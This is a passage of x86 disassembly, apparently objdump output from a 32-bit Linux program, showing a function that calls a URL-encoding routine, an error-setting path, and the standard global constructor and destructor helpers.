not    ecx
sub    esp,0x8
dec    ecx
push   ecx
push   edx
call   804dd08 <urlencoden>
mov    edi,DWORD PTR [ebp-0x4]
leave  
ret    
push   edi
push   0x0
push   0x804f17a
push   0x6
call   804a860 <seterror>
xor    eax,eax
mov    edi,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebp
mov    ebp,esp
push   ebx
push   edx
mov    ebx,0x8055818
mov    eax,ds:0x8055818
jmp    804deab <__do_global_ctors_aux+0x1b>
lea    esi,[esi+0x0]
sub    ebx,0x4
call   eax
mov    eax,DWORD PTR [ebx]
cmp    eax,0xffffffff
jne    804dea4 <__do_global_ctors_aux+0x14>
pop    eax
pop    ebx
leave  
ret    
sub    esp,0xc
call   8049030 <__do_global_dtors_aux>
add    esp,0xc
ret    
